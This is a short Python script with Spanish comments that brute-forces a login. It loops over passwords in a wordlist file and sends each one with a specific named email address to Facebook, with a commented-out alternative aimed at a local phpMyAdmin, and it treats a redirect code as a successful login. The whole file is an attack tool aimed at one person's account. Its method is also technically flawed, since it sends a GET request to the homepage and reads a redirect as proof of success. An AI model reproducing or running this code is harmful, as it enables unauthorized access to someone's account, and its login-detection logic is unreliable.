import requests 

dictionary = open("pass.txt", "r") 

usuario = 'cabralzay@yahoo.com' # cabralzay@yahoo.com

for contra in dictionary:
    # Creamos una variables con los datos de POST
    datos = {
        'email':usuario, # email':usuario
        'pass':contra.strip("\n") #  pass':contra.strip("\n")
    }
    #print(datos)

    # Realizamos una peticion

    respuesta = requests.get("http://www.facebook.com", data=datos, allow_redirects=False)
    # respuesta = requests.get("http://192.168.0.104/phpmyadmin/", data=datos, allow_redirects=False)
    print("codigo de respuesta de la pagina web: %s " %(respuesta.status_code)) #%s
    #respuesta.url
    #respuesta.status_code

    # Comprobamos el resultado de la conexion se nos devolve un codigo 301 o 302

    #print(respuesta.history[0].status_code)

    if respuesta.status_code in [301, 302]: # if respuesta.history[0].status_code in [301,302]:
        print("Hay combinaciones")
        print(datos)
        break
    else:
        # print("HHH")
        print("NADA")
        print(respuesta.status_code)

print("------------------ FINAL ----------------------")